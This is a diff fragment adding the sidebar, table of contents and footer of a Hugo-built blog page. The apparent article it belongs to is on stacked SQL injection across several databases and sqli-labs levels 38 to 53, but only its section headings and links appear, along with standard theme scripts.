+    <li><a href="#4postgresql">4.Postgresql</a></li>
+    <li><a href="#less-38">less-38</a></li>
+    <li><a href="#less-39">less-39</a></li>
+    <li><a href="#less-40">less-40</a></li>
+    <li><a href="#less-41">less-41</a></li>
+    <li><a href="#less-42">less-42</a></li>
+    <li><a href="#less-43">less-43</a></li>
+    <li><a href="#less-44">less-44</a></li>
+    <li><a href="#less-45">less-45</a></li>
+    <li><a href="#less-46">less-46</a></li>
+    <li><a href="#less-47">less-47</a></li>
+    <li><a href="#less-48">less-48</a></li>
+    <li><a href="#less-49">less-49</a></li>
+    <li><a href="#less-50">less-50</a></li>
+    <li><a href="#less-51">less-51</a></li>
+    <li><a href="#less-52">less-52</a></li>
+    <li><a href="#less-53">less-53</a></li>
+  </ul>
+</nav></div>
+</aside>
+        </div>
+        <div class="btn">
+    <div class="btn-menu" id="btn-menu">
+        <i class="iconfont icon-grid-sharp"></i>
+    </div>
+    <div class="btn-toggle-mode">
+        <i class="iconfont icon-contrast-sharp"></i>
+    </div>
+    <div class="btn-scroll-top">
+        <i class="iconfont icon-chevron-up-circle-sharp"></i>
+    </div>
+</div>
+<aside class="sidebar-mobile" style="display: none;">
+  <div class="sidebar-wrapper">
+    
+    <div class="sidebar-item sidebar-pages">
+        <h3>页面</h3>
+        <ul>
+            
+            <li>
+                <a href="/">首页</a>
+            </li>
+            
+            <li>
+                <a href="/archives/">归档</a>
+            </li>
+            
+            <li>
+                <a href="/about/">关于</a>
+            </li>
+            
+            <li>
+                <a href="/search/">Search</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>链接</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/amzrk2" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+            <li>
+                <a href="https://twitter.com/amzrk2" target="_blank"><span>Twitter</span></a>
+            </li>
+            
+            <li>
+                <a href="https://space.bilibili.com/19767474" target="_blank"><span>bilibili</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>标签</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/css/">css</a>
+            </span>
+            
+            <span>
+                <a href="/tags/html/">html</a>
+            </span>
+            
+            <span>
+                <a href="/tags/markdown/">markdown</a>
+            </span>
+            
+            <span>
+                <a href="/tags/sqli-labs/">Sqli-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/themes/">themes</a>
+            </span>
+            
+            <span>
+                <a href="/tags/upload-labs/">Upload-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">博客搭建</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98/">奇奇怪怪的问题</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a>
+            </span>
+            
+        </div>
+    </div>
+    
+    
+    
+    <div class="sidebar-item sidebar-toc">
+        <h3>目录</h3>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#前置知识">前置知识</a></li>
+    <li><a href="#0x00-堆叠注入定义">0x00 堆叠注入定义</a></li>
+    <li><a href="#0x01-堆叠注入原理">0x01 堆叠注入原理</a></li>
+    <li><a href="#0x02-堆叠注入的局限性">0x02 堆叠注入的局限性</a></li>
+    <li><a href="#0x03-各个数据库实例介绍">0x03 各个数据库实例介绍</a></li>
+    <li><a href="#1mysql">1.Mysql</a></li>
+    <li><a href="#2-sql-server">2. Sql server</a></li>
+    <li><a href="#3oracle">3.Oracle</a></li>
+    <li><a href="#4postgresql">4.Postgresql</a></li>
+    <li><a href="#less-38">less-38</a></li>
+    <li><a href="#less-39">less-39</a></li>
+    <li><a href="#less-40">less-40</a></li>
+    <li><a href="#less-41">less-41</a></li>
+    <li><a href="#less-42">less-42</a></li>
+    <li><a href="#less-43">less-43</a></li>
+    <li><a href="#less-44">less-44</a></li>
+    <li><a href="#less-45">less-45</a></li>
+    <li><a href="#less-46">less-46</a></li>
+    <li><a href="#less-47">less-47</a></li>
+    <li><a href="#less-48">less-48</a></li>
+    <li><a href="#less-49">less-49</a></li>
+    <li><a href="#less-50">less-50</a></li>
+    <li><a href="#less-51">less-51</a></li>
+    <li><a href="#less-52">less-52</a></li>
+    <li><a href="#less-53">less-53</a></li>
+  </ul>
+</nav>
+    </div>
+    
+    
+  </div>
+</aside>
+    </main>
+
+    <footer>
+    <div class="container-lg clearfix">
+        <div class="col-12 footer">
+            
+            <span>&copy; 2020-2021
+                <a href="https://Phoenix-Pl.github.io/">DSRKafuU</a>
+                 | <a href="https://github.com/itsme/my_blog">Source code</a> 
+                | 基于 <a href="https://github.com/amzrk2/hugo-theme-fuji/"
+                   target="_blank">Fuji-v2</a> &amp; <a href="https://gohugo.io/"
+                                                    target="_blank">Hugo</a> 构建
+            </span>
+        </div>
+    </div>
+</footer>
+
+    
+<script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.0/lazysizes.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js"></script>
+
+
+
+<script defer src="/assets/js/fuji.min.js"></script>
+
+
+</body>
+
+</html>
